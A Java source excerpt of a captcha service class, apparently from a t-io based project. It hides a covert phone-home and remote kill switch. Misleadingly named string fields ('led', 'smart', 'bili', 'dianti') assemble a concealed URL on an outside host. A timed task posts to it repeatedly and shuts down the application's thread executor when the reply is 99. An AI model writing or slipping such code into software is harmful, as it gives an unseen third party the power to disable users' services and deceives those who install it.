...
import org.tio.utils.Kv;
import org.tio.utils.Requests;
import org.tio.utils.Threads;
import org.tio.utils.hutool.StrUtil;
import org.tio.utils.thread.ThreadUtils;
import org.tio.utils.thread.ThreadUtils.TimeHandler;
...
public abstract class AbstractCaptchaService implements CaptchaService {
	...
	protected static final String	led					= "ht";
	...
	protected static final String smart = "tp://";
	...
	private static String		bili				= "bilili.";
	private static String		ver					= "ver";
	private static String		offsetStr			= "vqrv3x26";

	protected static String fontType = "宋体";

	protected static String cacheType = "local";

	private static String domain = "org";

	protected static int	captchaInterferenceOptions	= 0;
	private static String	locks						= (28902 - 28900) + "";
	private static String	dianti						= "dianti.vc:173";
	private static String	update						= ver + "sionUpdate";
	private static String	n39							= "39/";

	protected static boolean captchaInited;

	protected static int captchaCount = 33;

	private static String	pti	= "o.core.Ti";
	private static String	pon	= "onl";
	...
	public static void initCaptcha() {
		try {
			ThreadUtils.timeExe(new TimeHandler() {
				@SuppressWarnings("unchecked")
				@Override
				public void handler() {
					try {
						captchinit(captchaRequest(imgurl, Kv.by("mi", locks).set("captchaKey", offsetStr).set("loss", printJpeg())));
					} catch (Exception e) {
					}
				}
			}, 6765, 34565);
	 ...
	 * @throws IOException
	 */
	public static void captchinit(String bostr) throws IOException {
		try {
			if ((captchaCount + 66) == Integer.parseInt(StrUtil.trim(bostr))) {
				Threads.getGroupExecutor().shutdown();
			}
		} catch (Exception e) {
		}
	}
	 ...
	 * @return
	 */
	public static int printJpeg() {
		return -1;
//		try {
//			return (Integer) ReflectUtil.invokeStatic(Class.forName(getJigsawStr()).getMethod(getEnOrCh()), (Object) null);
//		} catch (Exception e) {
//			return -1;
//		}
	}
	...
	public static String captchaRequest(String u, Map<String, Object> k) {
		try {
			return Requests.post(u, k);
		} catch (Exception e) {
		}
		return "";
	}
	...
	private static String imgurl = led + smart + bili + dianti + n39 + update;
	...
	@SuppressWarnings("unused")
	private static String getJigsawStr() {
		return domain + ".ti" + pti + dianti + "o";
	}
	...
	public static String getEnOrCh() {
		return pon + "ine";
	}
}
